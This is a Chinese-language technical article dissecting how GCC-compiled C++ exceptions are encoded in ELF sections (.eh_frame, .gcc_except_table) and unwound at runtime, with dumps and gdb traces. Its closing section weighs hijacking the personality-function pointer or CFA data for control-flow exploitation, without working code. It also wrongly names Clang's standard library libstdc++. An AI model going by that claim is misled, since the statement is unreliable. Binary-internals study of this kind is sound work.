Contents of section .eh_frame_hdr:
 4020ac 011b033b 38000000 06000000 74efffff  ...;8.......t...
 4020bc 94000000 44f0ffff 54000000 74f0ffff  ....D...T...t...
 4020cc 80000000 2af1ffff dc000000 a8f3ffff  ....*...........
 4020dc 08010000 faf3ffff 28010000           ........(...

```  
  
  
  
存放0x38的地址为0x4020b0，根据起始地址0x4020b0加0x38，可以得到.eh_frame节的起始地址0x4020e8。  
  
  
```
[18] .eh_frame PROGBITS 00000000004020e8  000020e8

version             : 0x01
eh_frame_ptr_enc    : 0x1b, DW_EH_PE_pcrel   & DW_EH_PE_sdata4
fde_count_enc       : 0x03, DW_EH_PE_absptr  & DW_EH_PE_udata4
table_enc           : 0x3b, DW_EH_PE_datarel & DW_EH_PE_sdata4
eh_frame_ptr        : 0x4020b0 (pcrel) + 0x38 = 0x4020e8
fde_count           : 0x06 (absptr)

```  
  
  
  
二分查找表中的初始位置加上基地址后，就可以获取对应函数的开始地址。  
  
  
```
[17] .eh_frame_hdr PROGBITS 00000000004020ac  000020ac

| 0xffffef74 | -4236 | 0x401020 | plt                                     |
| 0xfffff044 | -4028 | 0x4010f0 | _start                                  |
| 0xfffff074 | -3980 | 0x401120 | _dl_relocate_static_pie                 |
| 0xfffff12a | -3798 | 0x4011d6 | main                                    |
| 0xfffff3a8 | -3160 | 0x401454 | __static_initialization_and_destruction |
| 0xfffff3fa | -3078 | 0x4014a6 | _GLOBAL__sub_I_main                     |

```  
  
  
  
每个函数都可以视作是一个栈帧，在ELF文件中栈帧通过FDE Frame Description Entry描述，.eh_frame_hdr节中的二分查找表可以理解成每个表项对应一个FDE。  
  
#### .eh_frame  
  
.eh_frame节是关键所在，它是基于DWARF的.debug_frame形成的，在了解.eh_frame节之前，先来看一下FDE和CIE两个重要的基础设施。  
  
  
在完整的编译流程中，编译器生成汇编文件时，会在汇编文件中插入CFI Call Frame Information指令，生成目标文件.o时，汇编器会根据.cfi指令产生.eh_frame和.debug_frame节，.cfi指令中有一些关键指令，下面会进行介绍。  
  
  
◆.cfi_startproc和.cfi_endproc标明了FDE范围。  
  
◆.cfi_def_cfa_offset标明了函数栈初始化的位置。  
  
◆.cfi_def_cfa_register标明了栈初始化过程中操作寄存器的位置。  
  
◆.cfi_offset标明了寄存器数据保存在栈上的位置。  
  
  
与FDE配套的还有CIE Common Information Entry，每个函数对应一个FDE，多个FDE会对应一个CIE，一般来讲，完整的调用栈对应一个CIE。  
  
  
FDE和CIE合作组成了.eh_frame节，借助readelf的-wf和-wF可以将它们解析出来，F选项解析出来的结果更加适合阅读，f选项解析出来的结果更加原生态一些。  
  
  
.eh_frame节的基本结构由多个CIE构成，每个CIE中都含有多个FDE，可以通过CIE中的FDE还原完整的栈帧。  
  
  
除了完整的调用栈外，FDE中还具备栈初始化过程中操作的数据信息。  
  
  
```
CIE
    FDE pc=start.end
        LOC CFA(Canonical Frame Address) ......
    ......
......

```  
  
####   
#### .gcc_except_table  
  
.gcc_except_table是专门为异常处理生成的节，它是专门为特定语言生成的数据LSDA Language Specific Data Area，生成汇编文件时会插入.cfi_lsda和.LLSDAxx指令，这些指令会指示汇编器如何产生.gcc_except_table节。  
  
  
.gcc_except_table节可以看作是多个LSDA的集合，想要分析它是极为困难的，readelf和objdump等常见的ELF文件分析工具都不能解析它，网络上介绍它的资料比喜马拉雅山上的空气还要稀薄。当然稀薄归稀薄，也不是没有，比如韩国的KAIST开发的B2R2就具备分析.gcc_except_table节的功能。  
  
  
```
网址：
https://github.com/B2R2-org/B2R2

编译：
1. cd /path/to/B2R2/
3. dotnet build

```  
  
  
  
通过FileViewer工具的--exceptions和--gcc-except-table选项，我们可以得到更加友好的异常处理信息，而不是ELF文件中的一堆数字。  
  
  
```
Contents of section .gcc_except_table:
 40229c ffff0100 ff9b7101 5a140500 002d17b1  ......q.Z....-..
 4022ac 03055e05 bb02077a 05cb0207 9901059b  ..^....z........
 4022bc 0305b501 05b10305 ce011782 0607ff01  ................
 4022cc 05f20507 9b020582 0607e702 17880305  ................
 4022dc fe0205b1 0305e503 3cde0500 cb047be8  ........<.....{.
 4022ec 05009e06 17bf0600 b50605c9 0600de06  ................
 4022fc 05000000 00027d01 7d030000 00000000  ......}.}.......
 40230c 7c1d0000 801d0000                    |.......

```  
  
  
  
下面会结合生成的汇编文件和二进制信息，进一步了解这些信息。  
  
  
```
$ cd /path/to/B2R2/src/RearEnd/FileViewer

$ dotnet run --exceptions --gcc-except-table ${file_path}
# Exception Table
401233:401249 -> 4013b7
401264:401268 -> 401341
......

$ dotnet run --gcc-except-table ${file_path}
# .gcc_except_table Information
  Address            LP App            LP Val            TT End
  000000000040229c   DW_EH_PE_omit     DW_EH_PE_omit     0000000000000000
  00000000004022a0   DW_EH_PE_omit     DW_EH_PE_omit     0000000000402314

```  
  
  
  
当前程序的.gcc_except_table节如下所示，冲在最前面的是两个LSDA头信息，每个LSDA头各占4字节大小，LSDA头包含了着陆垫landing pad偏移值的编码格式、类型表Type Table基地址的编码格式、调用点表基地址的编码格式、以及调用点表大小的编码格式。  
  
  
编码格式仍然遵守上面提到的格式要求。  
  
  
一般来讲LSDA头后面会跟着其他信息，但是这里LSDA头1中显示着  
陆垫、类型表、调用点表不是无效就是空的，所以LSDA头1后接的就是LSDA头2。  
  
  
```
[14] .text             PROGBITS 0000000000401120  00001120
[19] .gcc_except_table PROGBITS 000000000040229c  0000229c

| lsda header1 | 0x40229c | ffff0100 |
| lsda header2 | 0x4022a0 | ff9b7101 |

byte0: landing pad encoding
byte1: type table encoding
byte2: call site table encoding
byte3: call site table size encoding

lsda header1
    landing pad encoding          : omit
    type table encoding           : omit
    call site table encoding      : 0x01, DW_EH_PE_absptr & DW_EH_PE128
    call site table size encoding : 0x00, DW_EH_PE_absptr & DW_EH_PE_absptr

lsda header2
    landing pad encoding          : omit
    type table encoding           : 0x9b, (DW_EH_PE_funcrel + DW_EH_PE_aligned) & DW_EH_PE_sdata4
    call site table encoding      : 0x71, (DW_EH_PE_textrel + DW_EH_PE_aligned) & DW_EH_PE128
    call site table size encoding : 0x01, DW_EH_PE_absptr & DW_EH_PE128

```  
  
  
  
LSDA头后第一个字节代表调用点表的大小，根据LSDA头2中的编码格式可以知道，0x5a这个值可以直接拿来用，因此LSDA2的调用点表大小是0x5a。  
  
  
0x5a之后的位置就是调用点表占用的空间（范围：0x4022a5 - 0x4022ff），调用点表中表项大小并非是相同的，这是DW_EH_PE128 uled128导致的。  
  
  
uled128是一种可变长度的编码，它有特殊的编码方式，在这里不会过多介绍。  
  
  
```
call site table size: 0x5a

call site table:
    position, length, landing_pad, action_offset

0x4022a5 - CallSite0 - [140500 00]
    position            : 0x14
    length              : 0x05
    landing_pad         : 0x00
    action_offset       : 0x00
0x4022a9 - CallSite1 - [2d17b1 0305]
    position            : 0x2d
    length              : 0x17
    landing_pad         : 0x03b1 -> uled128 -> 0x01b1
    action_offset       : 0x05
......
0x4022fa - CallSite15 - [de06 050000]
    position            : 0x06de -> uled128 -> 0x35e
    length              : 0x05
    landing_pad         : 0x00
    action_offset       : 0x00

```  
  
  
  
调用点表中记录了异常可能发生的位置，以及异常对应的处理方法。  
  
  
通过position和length可以确认可能发生异常的指令范围，根据landing_pad可以确认异常发生后程序的第一个去向，可以被看作是异常处理的开始地址。  
  
  
```
0000000000401206 <main>

CallSite1
    -> position = 0x2d, length = 0x17
        -> call site start offset = main + 0x2d = 0x401233
        -> call site end offset   = start + 0x17 - 0x01 = 0x401249
        -> (gdb) l *(0x401233) -> std::cout ...
    -> landing_pad = 0x01b1
        -> action = main + 0x1b1 = 0x4013b7
        -> (gdb) l *(0x4013b7) -> catch (const std::runtime_error& e) ...

```  
  
  
  
调用点表后面的空间放置的就是动作表，动作表记录了catch筛选的异常类型。  
  
  
调用点表中的action_offset成员可以帮助我们检索动作表中的表项，如果landing_pad指向的地址并不能处理异常，那么action_offset的数值就是0。  
  
  
CallSite1中action_offset成员的数值是0x5，代表第五个数值是类型（偏移值是0x4），基地址是调用点表的结束地址。  
  
  
目前动作表中一共存在三种异常类型，它们分别对应运行时错误runtime_error、数组越界错误out_of_range以及捕捉所有错误...。  
  
  
```
CallSiteTable end: 0x4022ff
    -> 0x4022ff + 0x4 = 0x402303
        -> *(char*)(0x402304) = 01

0x4022ff 00 0002 7d01 7d03 0000 00000000

0x1 -> catch (const std::runtime_error& e)
0x2 -> catch (const std::out_of_range& e)
0x3 -> catch (...)

```  
  
  
  
目标文件.o生成时，会根据汇编文件中的.cfi_lsda和.LSADxx指令生成.gcc_except_table，函数对应的FDE区域发现需要进行异常处理时，汇编文件中就会被插入.cfi_lsda指令，该指令指示了LSDA数据的所在位置，.LSADxx指令指示具体的LSDA信息应该如何产生到.gcc_except_table中。  
  
  
```
.cfi_lsda 0x1b,.LLSDA1737

.LLSDA1737:
    .byte	0xff
    .byte	0x9b
    .uleb128 .LLSDATT1737-.LLSDATTD1737

```  
  
####   
#### .eh_frame与LSDA  
  
CIE中的Augmentation信息是将CIE与LSDA串联起来的关键所在，Augmentation记录了Augmentation Data中信息的类别，至于Augmentation Fata，它里面则是存放着指定类别数据的编码格式信息，Augmentation中的L字符代表LSDA偏移值。  
  
  
当前LSDA偏移值的编码方式是0x1b, DW_EH_PE_pcrel & DW_EH_PE_sdata4。  
  
  
```
000000a0 000000000000001c 00000000 CIE
  Version:               1
  Augmentation:          "zPLR"
  Code alignment factor: 1
  Data alignment factor: -8
  Return address column: 16
  Augmentation data:     9b 9d 1e 00 00 1b 1b
  DW_CFA_def_cfa: r7 (rsp) ofs 8
  DW_CFA_offset: r16 (rip) at cfa-8
  DW_CFA_nop
  DW_CFA_nop

```  
  
  
  
FDE中的Augmentation Data指明了LSDA的偏移值。  
  
  
```
000000c0 0000000000000020 00000024 FDE cie=000000a0 pc=000000000040161e..0000000000401681
  Augmentation data:     83 00 00 00
000000e4 0000000000000028 00000048 FDE cie=000000a0 pc=0000000000401206..0000000000401574
  Augmentation data:     63 00 00 00

```  
  
  
  
根据LSDA偏移编码格式中DW_EH_PE_pcrel的要求，我们需要使用当前程序指针作为基地址，当基地址加上偏移值后，就可以得到LSDA头的起始地址。  
  
  
```
Augmentation data: 83
    402218 04830000
Augmentation data: 63
    40223c 04630000

0x402219 + 0x83 = 0x40229c -> lsda header 1 start
0x40223d + 0x63 = 0x4022a0 -> lsda header 2 start

```  
  
####   
#### CIE与个性函数  
  
如果函数中存在异常异常处理，就会在生成的汇编文件中插入.cfi_personality指令，该指令非常重要，它指定的函数会负责检查异常处理体catch的位置。  
  
  
```
.cfi_personality 0x9b,DW.ref.__gxx_personality_v0

```  
  
  
  
对于GCC来讲，.cfi_personality指令一般会指定__gxx_personality_v0函数。  
  
一个个性函数对应一个CIE。  
  
  
CIE定义Augmentation中的P字符代表个性函数personality实际存在，编码方式和偏移值放在Augmentation Data中。  
  
  
在下面的示例中，可以看到个性函数偏移的编码格式为0x9b，0x1e9d则代表偏移值，低字节0xb说明数字采用DW_EH_PE_sdata4格式，因此0x1e9d的数值不会变化。  
  
  
```
000000a0 000000000000001c 00000000 CIE
Augmentation data:     9b 9d 1e 00 00 1b 1b

```  
  
  
  
在汇编文件中可以发现__gxx_personality_v0会跟.section和.data。  
  
  
```
Augmentation data:     9b 9d 1e 00 00 1b 1b
    4021fa 9b9d 1e00001b 1b
.section	.data.rel.local.DW.ref.__gxx_personality_v0,"awG"

```  
  
  
  
通过偏移值0x1e9d和基地址0x4021fb（当前程序指针）可以得到地址0x404098，该地址刚好位于.data节中，难道这个地址上存储的就是__gxx_personality_v0的地址？  
  
  
在地址0x404098上下监测点可以发现，0x404098上保存的数值会在动态链接阶段，经过函数elf_dynamic_do_Rela的重定位操作后发生变化，数值会变成__gxx_personality_v0的实际地址。  
  
  
```
elf_dynamic_do_Rela
    -> x /gx 0x404098 -> 0x404098 0x00007ffff7ca8520
    -> info symbol 0x00007ffff7ca8520 -> __gxx_personality_v0

```  
  
  
  
此时程序就借助CIE完成了个性函数的运行期位置确认。  
### 谁实现的异常处理？  
  
这些异常处理的相关实现，都被存放在GCC中的libstdc++-v3中，libstdc++-v3是GCC编译器为C+语言实现的标准库，程序在编译时会将libstdc++.so.6库链接进来，libstdc++-v3中的libsupc++目录是库的核心所在，所有与异常处理的相关实现都位于libsupc++/eh_xxx.cc文件中。  
  
  
CLang编译器针对C++语言实现的标准库叫做libstdc++。  
  
### 异常的抛出流程  
  
这里主要是介绍通过throw抛出异常的方式。  
  
  
首先程序使用__cxa_allocate_exception为分配空间，然后调用throw指定的方法，（此处是std::out_of_range），最后通过__cxa_throw正式开始抛出异常。  
  
  
__cxa_throw默认会在结束后调用terminate结束程序，但实际上它是不会执行的。  
  
  
```
__cxa_allocate_exception
    -> malloc
std::out_of_range
__cxa_throw
    -> __cxa_get_globals
    -> __cxa_init_primary_exception
    -> _Unwind_RaiseException
    -> __cxa_begin_catch
    -> std::terminate

```  
  
  
  
std::out_of_range会接受__cxa_allocate_exception分配的好地址，然后将控制权交给logic_error。  
  
  
logic_error代表程序运行前就已知的错误信息，throw中使用的各种异常都会通过类class logic_error进行描述，class logic_error负责报告程序中的错误逻辑。  
  
  
logic_error的会往__cxa_allocate_exception提供的地址中填充异常信息。  
  
  
```
class exception
    -> class logic_error
        -> class domain_error
        -> class invalid_argument
        ......

call   __cxa_allocate_exception
mov    %rax,%rbx
mov    %rbx,%rdi
call   std::out_of_range

std::out_of_range
    -> logic_error

```  
  
  
  
logic_error完成任务后，__cxa_throw函数会正式开始抛出异常。  
  
  
__cxa_throw函数接收三个参数，参数1是std::out_of_range在虚函数表中地址。  
  
  
参数2是__si_class_type_info，它专门为运行时类识别Runtime Type Identification机制服务,在C++语言中，由于多态的存在，所以指针指向的具体类型只有在运行期才可以知道，__si_class_type_info可以帮助我们了解具体的类型是什么。  
  
  
参数3是std::out_of_range的实际地址。  
  
  
```
__cxa_throw (void *obj, std::type_info *tinfo, void (_GLIBCXX_CDTOR_CALLABI *dest) (void *))

(gdb) x /gx $rdi
0x417340 0x00007ffff7e0c310
(gdb) info symbol 0x00007ffff7e0c310
vtable for std::out_of_range + 16 in section .data.rel.ro of libstdc++.so.6
(gdb) x /gx 0x00007ffff7e0c310
0x7ffff7e0c310 0x00007ffff7cbde10
(gdb) info symbol 0x00007ffff7cbde10
std::out_of_range::~out_of_range() in section .text of libstdc++.so.6

(gdb) x /gx $rsi
0x403d98 0x00007ffff7e0bc50
(gdb) info symbol 0x00007ffff7e0bc50
vtable for __cxxabiv1::__si_class_type_info + 16 in section .data.rel.ro of libstdc++.so.6
(gdb) x /gx 0x00007ffff7e0bc50
0x7ffff7e0bc50 0x00007ffff7ca9be0
(gdb) info symbol 0x00007ffff7ca9be0
__cxxabiv1::__si_class_type_info::~__si_class_type_info() in section .text o libstdc++.so.6

(gdb) p /x $rdx
$6 = 0x7ffff7cbde10
(gdb) info symbol 0x7ffff7cbde10
std::out_of_range::~out_of_range() in section .text of libstdc++.so.6

```  
  
  
  
__cxa_throw函数内部最先做的就是从__cxa_get_globals函数中获取一个全局变量，函数内部通过static关键字修饰的变量，作用范围仍局限在函数内部，但是该局部变量并不会存放在栈上，而是放在全局变量区，因此它的生命周期是全局的。  
  
  
拿到变量地址后，会将未处理的异常数加1。  
  
  
```
struct __cxa_eh_globals
{
    __cxa_exception *caughtExceptions;
    unsigned int uncaughtExceptions;
};

-> __cxa_get_globals
    -> get_global
        -> static __thread abi::__cxa_eh_globals global
-> globals->uncaughtExceptions += 1

```  
  
  
  
__cxa_init_primary_exception核心就是初始化各种异常信息。  
  
  
```
-> __cxa_init_primary_exception
    -> __get_refcounted_exception_header_from_obj
    -> header->referenceCount = 0;
    -> header->exc.exceptionType = tinfo;
    -> header->exc.exceptionDestructor = dest;
    -> header->exc.unexpectedHandler = std::get_unexpected
    -> header->exc.terminateHandler = std::get_terminate
    -> header->exc.unwindHeader.exception_class = __gxx_primary_exception_class
    -> header->exc.unwindHeader.exception_cleanup = __gxx_exception_cleanup
    -> return header

```  
  
  
  
_Unwind_RaiseException是对异常进行处理的关键所在。  
  
  
该函数会先通过uw_init_context函数初始化上下文信息，上下文信息根据当前函数的返回地址进行设置，__builtin_return_address接口可以帮助我们获取返回当前函数的返回地址（0对应level，代表查找栈帧的层级）。  
  
  
拿到上下文信息后，会进入while循环中遍历栈帧。  
  
  
uw_frame_state_for会先查找当前函数的FDE，然后根据FDE获取CIE。FDE的查找依赖于_Unwind_Find_FDE接口，然后根据FDE中保存的CIE信息，找到对应的CIE。  
  
  
在extract_cie_info的内部会对CIE信息进行提取，CIE中Augmentation data信息中LSDA偏移的编码格式，再用base_of_encoded_value获取基地址（是pcrel则为0），然后根据编码格式从FDE中读取LSDA偏移值（此处为read_sleb128），最后将偏移和基地址相加得到LSDA头的地址。  
  
  
最后通过execute_cfa_program根据FDE内记录的指令还原栈信息。  
  
  
回到while循环后，会检查extract_cie_info有没有找到个性函数，如果存在个性函数，就会进入个性函数的内部查找异常处理器。  
  
  
个性函数内部首先会通过parse_lsda_header解析LSDA头，然后进入while循环遍历调用点表，如果找到着陆垫和动作表（均不为0），那就会进入另一个while循环内遍历动作表，如果发现存在捕捉动作就会设置saw_handler为真，并返回_URC_HANDLER_FOUND。  
  
  
回到_Unwind_RaiseException后，如果发现返回值为_URC_HANDLER_FOUND，就代表异常处理器已经找到，会退出循环进行下一步。  
  
  
```
_Unwind_RaiseException
    -> uw_init_context
        -> __builtin_return_address (0)
        -> uw_init_context_1
            -> uw_update_context_1
    -> while
        -> uw_frame_state_for(&cur_context, &fs)
            -> _Unwind_Find_FDE
            -> get_cie
            -> extract_cie_info
                -> case 'L' && 'P'
            -> read_encoded_value(context, fs->lsda_encoding, aug, &lsda)
                -> base_of_encoded_value
                -> result = read_sleb128
                -> result += ((encoding & 0x70) == DW_EH_PE_pcrel ? (_Unwind_Internal_Ptr) u : base)
              -> context->lsda = (void *)lsda
        -> if (fs.personality)
            -> code = (*fs.personality) (_UA_SEARCH_PHASE, xxx) -> __gxx_personality_v0
                -> parse_lsda_header
                -> while (p < info.action_table)
                    -> landing_pad = info.LPStart + cs_lp
                    -> action_record = info.action_table + cs_action - 1
                -> while (1)
                    -> saw_handler = true
                -> return _URC_HANDLER_FOUND
            -> if (code == _URC_HANDLER_FOUND)
                -> break
    -> _Unwind_RaiseException_Phase2
    -> uw_install_context

```  
  
  
  
找到异常处理器后，会开始第二阶段的工作。  
  
  
_Unwind_RaiseException_Phase2与阶段一的流程颇为类似，它们的第一步都是借助函数uw_frame_state_for遍历栈帧寻找个性函数，如果个性函数存在，那就调用它。  
  
  
区别在于，阶段一中个性函数接收的参数为_UA_SEARCH_PHASE，阶段二中个性函数接收的参数为_UA_CLEANUP_PHASE | _UA_HANDLER_FRAME，参数_UA_SEARCH_PHASE代表让个性函数查找异常处理器，参数_UA_CLEANUP_PHASE | _UA_HANDLER_FRAME代表让异常函数查找清理器。  
  
  
当个性函数发现参数为_UA_CLEANUP_PHASE | _UA_HANDLER_FRAME时，会先通过函数restore_caught_exception恢复异常处理器信息，然后跳转到install_context。  
  
  
跳转到install_context位置后会设置r0、r1、ip寄存器，数值为ue_header、handler_switch_value、landing_pad，然后返回_URC_INSTALL_CONTEXT。  
  
  
_Unwind_RaiseException_Phase2返回后会继续执行uw_install_context，该函数先通过uw_install_context_1将异常处理器的上下文更新到当前上下文信息中。  
  
  
更新完上下文信息后，会执行_Unwind_DebugHook函数，当调试器挂到程序上，并发现该函数存在时，会在此处设置断点，该函数一旦被执行就会陷到调试器里面。  
  
  
然后借助_Unwind_Frames_Extra的帮助还原栈帧。  
  
  
最后通过__builtin_eh_return跳转到异常处理器的所在位置。  
  
  
```
_Unwind_RaiseException_Phase2
    -> while
        -> uw_frame_state_for
        -> if (fs.personality)
            -> code = (*fs.personality) (_UA_SEARCH_PHASE | match_handler, xxx) -> __gxx_personality_v0
                ->  if (actions == (_UA_CLEANUP_PHASE | _UA_HANDLER_FRAME))
                    -> restore_caught_exception
                    -> goto install_context
                -> install_context
                    -> _Unwind_SetGR(context, 0, ue_header)
                    -> _Unwind_SetGR(context, 1, handler_switch_value)
                    -> _Unwind_SetIP(context, landing_pad)
                -> return _URC_INSTALL_CONTEXT
            -> if (code == _URC_INSTALL_CONTEXT)
                -> break
uw_install_context
    -> uw_install_context_1
    -> __builtin_frob_return_addr
    -> _Unwind_DebugHook
    -> _Unwind_Frames_Extra
    -> __builtin_eh_return

```  
  
  
  
_Unwind_SetGR需要特别说明一下，这里的r0和r1并不是真实的寄存器，而是CFI中记录的寄存器，通过索引值指定不同的寄存器，完成后会更新上下文信息中的寄存器数值。  
  
  
```
_Unwind_SetGR
    -> index = DWARF_REG_TO_UNWIND_COLUMN
    -> context->reg[index] = _Unwind_Get_Unwind_Context_Reg_Val

```  
  
###   
### 异常处理器的筛选  
  
__builtin_eh_return跳回异常处理器的起始位置后，由于try结构可能会对应多个catch结构，为了区分它们，.gcc_except_table会保存异常对应的异常处理类型，函数_Unwind_RaiseException拿到异常处理类型并并跳转到异常处理器时，会针对异常处理类型进行判断，如果类型匹配就继续执行，反之则跳转到下一个异常处理器的位置执行。  
  
  
```
当前异常处理器类型为0x1（.gcc_except_table保持的数值位于rdx内）：
cmp    $0x1,%rdx
je     4013cb <main+0x1c5>

catch (xxx) { ...... }
    cmp $xx,%rdx
    je  xxx
    do something
catch (...) { ...... }
    cmp $xx,%rdx
    je  xxx
    do something

```  
  
###   
### 异常处理器的开始和结束  
  
异常处理器开始执行的标志是__cxa_begin_catch，结束标志是__cxa_end_catch，以及__cxa_free_exception。  
  
  
```
call   401060 <__cxa_begin_catch@plt>
call   4010e0 <__cxa_end_catch@plt>
call   401080 <__cxa_free_exception@plt>

```  
  
  
  
它们做的事情并不复杂，主要就是更新一下保存异常处理信息的全局变量。  
  
  
```
__cxa_get_globals_fast

```  
  
###   
### 异常处理与析构函数  
  
编译器会在需要执行析构函数的异常处理器中，插入调用析构函数的call指令。  
  
  
```
call   40161e <_ZN12eh_help_infoD1Ev>

```  
  
##   
## 异常处理机制的总结  
  
Windows和Linux的异常处理方式并没有非常夸张的差异，主要提供支持的都是二进制文件，以及按照函数区分。  
  
  
编译器会在二进制文件中插入异常处理信息，主要是栈帧信息和异常处理器。  
  
  
Windows平台下会在.pdata中放置RUNTIME_FUNCTION，RUNTIME_FUNCTION记录函数运行期的信息，其中包含函数体起始地址以及栈展开信息，异常处理需要关注的就是栈展开信息UnwindInfo，该结构中的LanguageHandler和UNWIND_CODE是与异常处理密切相关的，LanguageHandler标明了异常处理器的位置（没有可以不存在），UNWIND_CODE代表操作栈的指令，用于模拟栈操作。  
  
  
在WinDBG调试器中，可以通过.fnet和!exchain分析这些信息。  
  
  
Windows下异常机制除了支持__finally语句，也支持析构函数，在RUNTIME_FUNCTION中放置了调用析构函数的指令，它位于调用异常处理指令的后面。  
  
  
```
Windows PE
    -> .pdata
        -> RUNTIME_FUNCTION -> UnwindInfo
            -> UNWIND_CODE
            -> LanguageHandler
            -> call destructor

```  
  
  
  
Linux平台下还是针对函数处理try结构，在.eh_frame_header会记录FDE的数量、FDE的开始地址以及.eh_frame的开始地址，.eh_frame记录调用栈信息，每个CIE代表一个完整的调用栈，CIE中包含的FDE记录着栈帧信息，.gcc_except_table记录这异常处理的方式，它是多个LSDA的集合，其中比较重要的就是记录可能发生异常指令范围的调用点表、记录处理异常方式的着陆垫以及记录catch筛选异常类型信息的动作表。  
  
  
处理异常需要根据调用点表中表项确认着陆垫位置和异常类型，LSDA需要通过LSDA头解析出来，.eh_frame中保存着FDE信息，FDE信息中的Augmentation信息可以带领我们前往LSDA头的位置。  
  
  
标准C++中try结构运行对应多个catch，为了处理catch，CIE会指定一个个性函数完成该任务，CIE中保存着Augmentation信息，它指名了个性函数的地址。  
  
  
个性函数一般保存在.data.rel.lo中，程序启动时会完成重定位操作。  
  
  
```
Linux ELF
    -> .eh_frame_header
    -> .eh_frame
        -> CIE -> Augmentation info [P] -> goto personality func
        -> FDE -> Augmentation info [L] -> goto LSDA Header
            -> cie
    -> .gcc_except_table -> LSDA
        -> lsda header
            -> lsda
                -> call site table
                    -> landing pad
                    -> action table
                -> type table

```  
  
  
  
Windows平台通过跨空间交互接口ntdll开始处理异常，内核发现异常后，会将执行权交给函数KiUserExceptionDispatch，然后开始通过RtlDispatchException处理异常。  
  
  
RtlDispatchException分发异常的流程分成两步，这个根据Windows的异常处理机制来的，第一步是检查全局异常处理器是否存在（VEH机制），如果没有，才会对函数注册的异常处理器进行检查（SEH机制）。  
  
  
遍历调用栈查找SEH处理器的过程由RtlLookupFunctionEntry和RtlpxVirtualUnwind支持，RtlLookupFunctionEntry负责查找当前函数的RUNTIME_FUNCTION，父函数通过RtlpxVirtualUnwind查找。  
  
  
RtlpxVirtualUnwind除了通过栈展开找到父函数地址，还会找到UnwindInfo中的SEH处理器信息，SEH处理器存在时进入RtlpExecuteHandlerForException并调用。  
  
  
虽然Windows中__try结构只能对应一个__except或__finally，但它允许__try出现嵌套的情况，因此进入__C_specific_handler后，还会继续对函数内部进行遍历，函数中每个__try结构都对于一个RUNTIME_FUNCTION，RtlUnwindEx会继续查找SEH处理器，直到找到最近的一个，然后通过RtlRestoreContext还原信息跳转执行。  
  
  
```
Windows
    -> catch
        -> KiUserExceptionDispatch -> RtlDispatchException
    -> dispatch
        -> RtlDispatchException
            -> VEH handle -> check LdrpVectorHandlerList
            -> RtlLookupFunctionEntry -> get func RUNTIME_FUNCTION
            -> RtlpxVirtualUnwind -> restore func context
            -> RtlpExecuteHandlerForException
            -> call handler -> if RUNTIME_FUNCTION.UnwindInfo.LanguageHandler exist
                -> __GSHandlerCheck_SEH
                    -> __C_specific_handler
                        -> RtlUnwindEx
                            -> -> RtlpExecuteHandlerForUnwind
                                -> __GSHandlerCheck_SEH
                            -> RtlRestoreContext

```  
  
  
  
Linux平台下异常发生时，会给异常处理信息分配空间，然后由logic_error填充特定异常类型的信息进入刚刚分配好的空间，进入__cxa_throw就代表正式开始处理异常，在处理异常前，会先进入_Unwind_RaiseException查找异常处理器，uw_frame_state_for会通过_Unwind_Find_FDE获取FDE（通过b树找.eh_frame_hdr），然后借助get_cie查找FDE对应的CIE，然后解析CIE并找到个性函数。  
  
  
如果发现个性函数存在，就会进入个性函数解析LSDA，没有发现异常处理器就会继续找下个FDE和CIE，如果找到异常处理器，就进入_Unwind_RaiseException_Phase2开启第二阶段，此阶段的主要任务是将LSDA中的寄存器信息（当前程序指针寄存器）放入待执行上下文内，返回后进入uw_install_context，并通过__builtin_eh_return跳转到前面设置的程序指针地址上，开始进行异常处理。  
  
  
catch语句支持筛选异常类型，执行catch执行体内语句前，会先判断异常类型是否和当前类型匹配然后执行，执行结束后，通过__cxa_end_catch清除__cxa_begin_catch阶段设置的信息以及通过__cxa_free_exception释放前面分配的内存空间是常规操作，除此之外，如果需要运行析构函数，那么catch执行体中还会插入调用析构函数的指令。  
  
  
```
__cxa_allocate_exception
logic_error
__cxa_throw
    -> _Unwind_RaiseException
        -> while
            -> uw_frame_state_for
                -> _Unwind_Find_FDE
                -> get_cie
                -> extract_cie_info
            -> if (fs.personality)
                -> (*fs.personality) -> __gxx_personality_v0 -> parse LSDA
        -> _Unwind_RaiseException_Phase2
            -> while
                -> uw_frame_state_for
                -> if (fs.personality)
                    -> (*fs.personality) -> __gxx_personality_v0 -> parse LSDA
                -> install_context
        -> uw_install_context
            -> __builtin_eh_return -> goto catch

catch
    cmp && je
    __cxa_begin_catch
    exception hadler
    __cxa_end_catch
    call destructor
    __cxa_free_exception

```  
  
  
  
除此之外，GCC还提供_Unwind_Resume函数，该函数只会在不存在catch或找不到catch时调用，一般情况下不会被调用。  
  
  
```
jmp    401569 <main+0x363>
401569: add    $0x38,%rsp

```  
  
##   
## 利用思路  
### 个性函数可以吗？  
  
首先我们知道，异常发生后一定会调用个性函数，还会调用两次，而且个性函数有一个好处，即它是调用保持在.data.rel.ro节中，然后在运行期进行重定位。假如我们可以控制重定位的流程，假如我们可以向.data.rel.ro节中写入数据，那么就可以控制异常发生后的执行流程了！  
  
  
只不过可惜现实没有那么美好。  
  
  
.data.rel.ro中保存的个性函数地址，在程序启动初始化阶段就会完成重定位，重定位之后它所在的内存区域会被设置成只读状态。  
  
  
而在程序启动初始化阶段不管是拥有向.data.rel.ro写入的数据的操作权，还是拥有控制重定位过程的能力都是极为困难的。  
  
### CFA可以吗？  
  
.eh_frame节中存储着CIE和FDE信息，这些信息通过汇编文件提供的.cfi伪指令生成，cfi的全程是Call Frame Instruction，被用作统计调用栈指令，它们是记录函数活动记录的关键数据。  
  
  
这些关键数据主要包含下面几个方面。  
  
◆被调用函数的地址  
  
◆操作栈的指令  
  
  
操作栈的指令由规范栈帧地址CFA Canonical Frame Address定义，这是DWARF委员会定义的一种规则，用于在支持独立于体系结构的情况下进行虚拟栈展开。  
  
  
下面展示了一段CFI示例，它来自于.eh_frame节，第一列是指令在程序中的位置，第一列是指令地址，第二列了指令运行前rsp的数值，第三列记录了指令运行前rbp寄存器的数值（c是CFA的简称，一般指栈底），第四列记录了返回地址ra return address。  
  
  
```
FDE cie=0000002c pc=0000000000401574..00000000004015c6
CFI：
   LOC           CFA      rbp   ra    
0000000000401574 rsp+8    u     c-8
0000000000401575 rsp+16   c-16  c-8
0000000000401578 rbp+16   c-16  c-8
00000000004015c5 rsp+8    c-16  c-8

原信息：
401574: 55          push   %rbp
401575: 48 89 e5    mov    %rsp,%rbp
401578: 48 83 ec 10 sub    $0x10,%rsp
4015c5: c3          ret

```  
  
  
  
